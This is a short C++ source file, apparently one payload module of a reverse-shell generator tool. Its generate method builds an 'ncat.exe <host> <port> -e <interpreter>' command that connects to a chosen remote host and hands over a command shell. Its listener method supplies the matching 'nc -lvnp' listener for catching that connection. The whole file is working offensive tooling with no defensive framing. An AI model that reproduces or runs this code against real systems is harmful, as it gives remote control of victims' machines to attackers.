#include "Ncat_Exe_E_Payload.h"
#include "../../listeners/ListenerFactory.h"

std::string NcatExeEPayload::name() const {
return "ncat_exe_e";
}

std::string NcatExeEPayload::generate(const Options& opts) const {
    return "ncat.exe " + opts.host + " " + std::to_string(opts.port) + " -e " + opts.interpreter;
}

std::string NcatExeEPayload::listener(const Options& opts) const {
    ListenerFactory factory;
    IListener* listener = factory.get(opts.listenerType);
    return listener ? listener->command(opts) : "nc -lvnp " + std::to_string(opts.port);
}